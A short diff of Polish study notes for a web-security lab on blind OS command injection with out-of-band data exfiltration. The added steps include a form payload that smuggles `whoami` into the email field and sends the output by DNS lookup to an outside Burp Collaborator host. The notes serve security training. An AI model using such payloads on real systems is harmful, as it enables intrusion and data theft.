@@ -1,6 +1,6 @@
 Lab: Blind OS command injection with out-of-band data exfiltration
 
-ormalny command injection:
+Normalny command injection:
 Wysyłasz → whoami → widzisz "carlos" w odpowiedzi ✅
 
 Blind command injection:
@@ -10,5 +10,9 @@ Out-of-band exfiltration:
 Wysyłasz → whoami → wynik leci na Twój Burp Collaborator ✅
 
 
-
-
+0. no logjn
+1. Znajdź podatne pole (feedback form)
+2. Uruchom Burp Collaborator 
+3. Zbuduj payload z nslookup w email:  csrf=JTXrTa9KzeTASCHhljsCrZ46DAtfeoAZ&name=K&email=x||nslookup+`whoami`.ftcol0ldawifr8gc8jx7yx4z0q6hu7iw.oastify.com||&subject=kk&message=kk
+4. Wyślij i sprawdź Collaborator
+5. Odczytaj username z DNS lookup: 
